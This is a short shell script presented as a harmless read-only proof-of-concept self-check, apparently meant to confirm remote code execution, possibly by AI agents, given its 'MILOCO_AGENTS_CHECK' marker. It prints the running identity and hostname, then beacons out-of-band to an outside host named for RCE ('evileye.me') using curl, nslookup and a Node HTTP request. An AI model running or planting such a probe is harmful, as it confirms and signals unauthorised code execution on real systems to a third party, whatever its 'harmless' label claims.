#!/bin/sh
# POC harmless self-check (无害化探测,只读)
set -u
M=MILOCO_AGENTS_CHECK
echo "/= $M identity /="
id
hostname
echo "/= $M oob /="
curl --connect-timeout 5 -s http://rce_715cf444_1794757191.evileye.me/ 2>&1 | tail -5
nslookup rce_715cf444_1794757191.evileye.me 2>&1 | tail -5
node -e "require('http').get('http://rce_715cf444_1794757191.evileye.me/')" 2>&1 | tail -5
echo "/= $M done /="
